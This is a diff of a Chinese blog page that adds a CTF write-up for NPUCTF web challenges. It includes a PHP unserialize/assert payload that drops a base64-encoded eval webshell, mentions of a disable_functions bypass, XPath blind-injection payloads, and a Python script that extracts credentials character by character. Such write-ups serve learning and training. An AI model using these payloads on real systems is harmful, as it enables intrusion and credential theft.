@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>NPUCTF web两题WP | 过客</title>
+  <title>NPUCTF web WP | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="NPUCTF web两题WP | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="NPUCTF web WP | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,7 +25,7 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
-    <meta property="og:description" content="NPUCTF web两题WP"/>
+    <meta property="og:description" content="NPUCTF web WP"/>
     <meta property="og:url" content="https://guokeya.github.io/post/a2pNpf37_/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
@@ -81,10 +81,10 @@
           	<span class="tags">
           	 
         </span>
-            <h1>NPUCTF web两题WP</h1>
+            <h1>NPUCTF web WP</h1>
             <span class="meta">
             	Posted on
-              2020-04-20，2 min read
+              2020-04-20，8 min read
             </span>
           </div>
         </div>
@@ -137,6 +137,197 @@ php标签用可以大小写绕过。都能解析的</p>
 </code></pre>
 <p>然后。phpinfo中有disable。我们需要bypass。上传文件。修改mail为error_log触发就行了</p>
 <p>貌似还能通过php7的包含溢出。getshell。但是那个需要爆破文件名。就。没有试了</p>
+<h1 id="查源码">查源码</h1>
+<p>F12不说了</p>
+<h1 id="realezphp">RealEzPHP</h1>
+<p>F12到time.php<br>
+得到源码</p>
+<pre><code>&lt;?php
+class HelloPhp
+{
+    public $a;
+    public $b;
+    public function __construct(){
+        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;
+        $this-&gt;b = &quot;date&quot;;
+    }
+    public function __destruct(){
+        $a = $this-&gt;a;
+        $b = $this-&gt;b;
+        echo $b($a);
+    }
+}
+$c = new HelloPhp;
+
+if(isset($_GET['source']))
+{
+    highlight_file(__FILE__);
+    die(0);
+}
+
+@$ppp = unserialize($_GET[&quot;data&quot;]);
+</code></pre>
+<p>很简短的代码。。反序列化控制属性<code>$b($a)</code>动态执行代码<br>
+这里直接试了下system。发现没反应。而scandir结果是个数组又不能ehco输出<br>
+想到用<code>assert('eval(&quot;phpinfo();&quot;)')</code>来执行代码</p>
+<pre><code>&lt;?php
+class HelloPhp
+{
+    public $a='eval(&quot;phpinfo();&quot;)';
+    public $b='assert';
+}
+$a=new HelloPhp();
+echo serialize($a);
+</code></pre>
+<p>调用phpinfo。发现有disable_function限制<br>
+先写个小马上去</p>
+<pre><code>&lt;?php
+class HelloPhp
+{
+     public $a='eval(&quot;file_put_contents(\'1.php\', base64_decode(\'PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==\'));&quot;)';
+    public $b='assert';
+}
+$a=new HelloPhp();
+echo serialize($a);
+</code></pre>
+<p>在传马的时候发现$_POST,这种会被替换为空。直接base64绕。<br>
+得到小马<br>
+然后就不多说了。error_log LD bypass。<br>
+或者蚁剑一键bypass。<br>
+去环境变量里找Flag</p>
+<h1 id="ezlogin">ezlogin</h1>
+<p>Xpath盲注<br>
+<code>https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97</code><br>
+XML格式如下</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;root&gt;
+    &lt;users&gt;
+        &lt;user&gt;
+            &lt;id&gt;1&lt;/id&gt;
+            &lt;username&gt;admin&lt;/username&gt;
+            &lt;password type=&quot;md5&quot;&gt;0192023a7bbd73250516f069df18b500&lt;/password&gt;
+        &lt;/user&gt;
+        &lt;user&gt;
+            &lt;id&gt;2&lt;/id&gt;
+            &lt;username&gt;jack&lt;/username&gt;
+            &lt;password type=&quot;md5&quot;&gt;1d6c1e168e362bc0092f247399003a88&lt;/password&gt;
+        &lt;/user&gt;
+&lt;/root&gt;
+</code></pre>
+<p>root是根元素。然后下面有users元素。users元素下面又有两个user元素。<br>
+查询语句如下</p>
+<pre><code>/root/users/user[username/text()='admin' and password/text()='123']
+查询/root/users/user中username的值是admin。并且password的值是123
+由于Xpath中不存在注释。所以得构造闭合语句
+</code></pre>
+<p>万能密码</p>
+<pre><code>admin' or '1
+/root/users/user[username/text()='admin' or '1' and password/text()='123']
+</code></pre>
+<p>布尔盲注</p>
+<pre><code>' or count(/)=1 or '1
+</code></pre>
+<p>判断根目录下的元素。如果根目录下只有1个元素就会返回True。进行布尔盲注<br>
+试一下<br>
+<img src="https://guokeya.github.io/post-images/1587431652333.png" alt="" loading="lazy"><br>
+提示非法操作。第一反应就是黑名单。<br>
+测试两个单引号。用户名或密码错误<br>
+测试万能密码。非法操作<br>
+测试关键字。用户名或密码错误<br>
+其实非法操作就是True。用户名或密码错误就是False。。<br>
+非法操作是个迷惑行为<br>
+得到根元素为1<br>
+然后</p>
+<pre><code>' or string-length(name(/*[1]))=1 or '1
+/*              根元素下的节点
+[1]             取第一个节点
+比如
+&lt;root&gt;
+    &lt;user&gt;
+        &lt;users&gt;
+         &lt;/users&gt;
+    &lt;/user&gt;
+&lt;/root&gt;
+&lt;root2&gt;
+    &lt;user&gt;
+        &lt;users&gt;
+         &lt;/users&gt;
+    &lt;/user&gt;
+&lt;/root2&gt;
+/*[1]就会取到根路径下的第一个节点。也就是root
+/*[2]就会取到根路径下的第二个截断。也就是root2
+</code></pre>
+<p>判断根元素的名字长度</p>
+<pre><code>' or substring(name(/*[1]), 1, 1)='a' or '1
+</code></pre>
+<p>判断根元素的第一个字符是a<br>
+然后依次判断得到根元素root</p>
+<pre><code>' or string-length(name(/root/*[1]))=1 or '1
+' or substring(name(/root/*[1]), 1, 1)='a' or '1
+</code></pre>
+<p>继续取<br>
+得到第二个截断为accounts</p>
+<pre><code>' or string-length(name(/root/accounts/*[1]))=1 or '1
+' or substring(name(/root/accounts/*[1]), 1, 1)='a' or '1
+</code></pre>
+<p>得到user</p>
+<pre><code>' or substring(name(/root/*[1]), 1, 1)='a' or '1
+' or substring(name(/root/accounts/user/*[1]), 1, 1)='a' or '1
+取user节点下的第一个。
+</code></pre>
+<p>这里通过遍历<code>[1][2][3]</code>得到id,username,password<br>
+此时已知格式如下</p>
+<pre><code>&lt;root&gt;
+    &lt;accounts&gt;
+        &lt;user&gt;
+            &lt;id&gt;1&lt;/id&gt;
+            &lt;username&gt;xx&lt;/username&gt;
+            &lt;password&gt;xx&lt;/password&gt;
+        &lt;/user&gt;
+        &lt;user&gt;
+            &lt;id&gt;2&lt;/id&gt;
+            &lt;username&gt;xx&lt;/username&gt;
+            &lt;password&gt;xx&lt;/password&gt;
+        &lt;/user&gt;
+    &lt;/accounts&gt;
+&lt;/root&gt;
+</code></pre>
+<p>那我们就可以取第N个user元素。获取下面的值</p>
+<pre><code>' or string-length(/root/accounts/user[1]/username/text())=5 or '1
+长度
+' or substring(/root/accounts/user[1]/username/text(), 1, 1)='g' or '1
+值
+</code></pre>
+<p>测试后。user第二个元素是a开头的。估计是admin。<br>
+下面是脚本</p>
+<pre><code>import requests
+import re
+import time
+r = requests.session()
+s='abcdefghijklmnopqrstuvwxyz1234567890'
+headers = {'Content-Type':'application/xml'}
+for a in range(1,50):
+    for b in s:
+        url='http://ha1cyon-ctf.fun:30267/'
+        token=re.search('&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*)&quot; /&gt;',r.get(url).text)[1]
+        data=&quot;&lt;username&gt;' or substring(/root/accounts/user[2]/username/text(), &quot;+str(a)+&quot;, 1)='&quot;+b+&quot;' or '1&lt;/username&gt;&lt;password&gt;12&lt;/password&gt;&lt;token&gt;&quot;+token+&quot;&lt;/token&gt;&quot;
+        result=r.post(url=url+'login.php',headers=headers,data=data).text
+        time.sleep(0.5)
+        if '非法操作' in result:
+            print(b)
+            break
+</code></pre>
+<p>得到adm1n,gtfly123<br>
+后台是个文件包含。返回结果不能有flag。并且伪协议都禁了。。<br>
+最后发现大小写绕过。。。。越简单的越容易被遗忘.</p>
+<h1 id="web">web🐕</h1>
+<p>这题。抄网上脚本。自己改改<br>
+第一关<br>
+<code>https://www.cnblogs.com/p00mj/p/11797786.html</code><br>
+第二关<br>
+<code>https://www.jianshu.com/p/7f171477a603</code><br>
+第三关。<br>
+java反编译。python转一下ascii就行</p>
 
           
           <p class="next-post">下一篇：
